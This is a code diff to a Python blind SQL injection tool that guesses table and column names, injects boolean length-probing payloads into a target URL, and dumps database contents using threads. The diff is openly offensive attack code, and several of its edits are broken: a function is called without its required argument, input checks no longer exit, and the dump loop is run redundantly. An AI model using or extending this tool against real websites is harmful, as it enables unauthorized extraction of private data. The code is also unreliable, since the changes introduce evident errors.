@@ -11,7 +11,6 @@ headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
 }
 
-
 def Generator_table():
     with open(os.path.join(os.getcwd(), "data/txt/tables.txt"), "r") as file:
         for table in file:
@@ -90,10 +89,10 @@ class Dump(object):
     def save_column(self, table, column):
         self.column_list.append((table, column))
 
-    def len_data(self):
+    def len_data(self, column, table):
         n = 0
         while True:
-            payload = "and (select top 1 len(%s) from %s)=%s" % (self.column, self.table, n)
+            payload = "and (select top 1 len(%s) from %s)=%s" % (column, table, n)
             url = self.url
 
             if '*' in url:
@@ -109,7 +108,7 @@ class Dump(object):
 
     def dump_data(self, table, column):
         data = ""
-        length = self.len_data()
+        length = self.len_data(column, table)
         print("[+] The Length of %s in %s is %s !" % (column, table, length))
         print("[+] Dumping data, please wait!")
 
@@ -139,7 +138,7 @@ class Dump(object):
                 except:
                     pass
 
-        global data_dir
+        data_dir = self.data_dir
         data_dir[(table, column)] = data
 
     def dump_all_result(self):
@@ -158,22 +157,23 @@ class Dump(object):
                 dumper.dbs(["database", "database"])
                 dumper.dbTables({"database": [table, table], "database2": [table, table]})
                 dumper.dbTableColumns({"database": {table: {column: "VARCHAR", column: "INTEGER"},
-                                                    table: {column: "UNKNOWN"}}})
+                                                table: {column: "UNKNOWN"}}})
                 dumper.dbTableColumns({table: column})
                 time.sleep(10)
 
-def run_col(dump_instance: Dump, table, column):
-    dump_instance.dump_data(table, column)
-    dump_instance.dump_all_result()
+def run_col(dump_instance: Dump):
+    for table in dump_instance.table_list:
+        for column in dump_instance.column_list:
+            dump_instance.dump_data(table, column)
+
+
 
 def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=10):
     if not url:
         print("[-] Invalid URL!")
-        sys.exit()
 
     if not keyword:
         print("[-] Please input the keyword of the true page!")
-        sys.exit()
 
     dump_instance = Dump(url, keyword)
 
@@ -183,6 +183,7 @@ def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=1
             thread = threading.Thread(target=test_tables, args=(dump_instance, keyword))
             thread.start()
             threads.append(thread)
+            run_col()
         for thread in threads:
             thread.join()
         print("\n[+] Table_name : ")
@@ -205,10 +206,11 @@ def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=1
             print("[+] %s in table: %s" % (col[1], col[0]))
 
     if dump:
+        run_col(dump_instance)
         threads = []
         for table in dump_instance.table_list:
             for column in dump_instance.column_list:
-                thread = threading.Thread(target=run_col, args=(dump_instance, table, column))
+                thread = threading.Thread(target=run_col, args=(dump_instance,))
                 thread.start()
                 threads.append(thread)
 
@@ -217,7 +219,6 @@ def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=1
             thread.join()
 
         print("[+] Dumping completed!")
-
 
 if __name__ == "__main__":
     main(
